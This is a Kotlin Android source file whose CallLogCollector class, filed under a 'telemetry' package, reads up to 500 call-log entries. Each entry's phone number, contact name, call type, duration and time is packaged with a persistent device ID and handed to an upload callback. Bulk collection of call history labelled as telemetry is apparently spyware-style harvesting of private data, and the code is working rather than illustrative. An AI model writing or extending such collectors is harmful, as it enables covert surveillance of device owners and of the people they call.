package com.pulsedrop.telemetry.collectors

import android.content.Context
import android.provider.CallLog
import com.pulsedrop.telemetry.data.CallLogEntry
import com.pulsedrop.telemetry.data.UploadEnvelope
import com.pulsedrop.telemetry.utils.PrefsManager

class CallLogCollector(
    private val context: Context,
    private val onData: (UploadEnvelope) -> Unit
) {
    private val prefs = PrefsManager(context)

    fun collectAll(limit: Int = 500) {
        val projection = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )

        context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection, null, null,
            "${CallLog.Calls.DATE} DESC LIMIT $limit"
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndex(CallLog.Calls._ID)
            val numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)

            while (cursor.moveToNext()) {
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    else -> "unknown"
                }

                val entry = CallLogEntry(
                    id = cursor.getString(idIdx),
                    number = cursor.getString(numIdx) ?: "",
                    contactName = cursor.getString(nameIdx),
                    type = type,
                    durationSeconds = cursor.getInt(durIdx),
                    timestamp = cursor.getLong(dateIdx)
                )
                onData(UploadEnvelope("call_log", prefs.deviceId, System.currentTimeMillis(), entry))
            }
        }
    }
}
